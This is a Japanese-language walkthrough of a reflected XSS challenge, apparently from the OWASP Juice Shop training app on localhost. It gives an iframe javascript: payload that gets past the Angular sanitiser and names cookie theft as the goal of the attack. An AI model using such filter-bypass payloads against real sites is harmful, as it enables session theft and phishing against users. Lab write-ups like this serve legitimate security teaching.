# Reflected XSS ✅

**難易度:** ⭐⭐
**カテゴリ:** XSS
**目標:** URLパラメータを使ってスクリプトを実行する

---

## 思考プロセス

**ステップ1: XSS の可能性を探す**
```
「URLにパラメータがあるページを探す」
    ↓
「注文追跡ページ /#/track-result?id=XXX を発見」
    ↓
「id の値がページに表示されている」
    ↓
「HTMLタグを入れたらどうなる？」
```

**ステップ2: 簡単なテスト**
1. `/#/track-result?id=<b>test</b>` にアクセス
2. 「test」が太字で表示される → HTMLが解釈されている！
3. これはXSSの脆弱性がある証拠

**ステップ3: スクリプト実行を試す**
```
「<script>alert('xss')</script> を試す」
    ↓
「動かない... フィルタされてる？」
    ↓
「<iframe> や <img> など別のタグを試す」
    ↓
「<iframe src="javascript:alert('xss')"> が動いた！」
```

## 実行手順

ブラウザのアドレスバーに以下を入力:
```
http://localhost:3000/#/track-result?id=<iframe src="javascript:alert('xss')">
```

## 解説

**なぜ `<script>` ではなく `<iframe>` なのか？**

| タグ | 結果 | 理由 |
|------|------|------|
| `<script>` | ❌ 動かない | Angular が自動でブロック |
| `<img onerror=...>` | ❌ 動かない | サニタイズされる |
| `<iframe src=javascript:...>` | ✅ 動く | フィルタをすり抜ける |

**攻撃シナリオ:**
```
攻撃者がこのURLをメールで送る
    ↓
被害者がクリックする
    ↓
被害者のブラウザでスクリプトが実行される
    ↓
Cookieを盗んだり、偽のログインフォームを表示できる
```

## 関連チャレンジ

- [DOM XSS](../difficulty-1/dom-xss.md)
- [HTTP-Header XSS](../difficulty-4/http-header-xss.md)
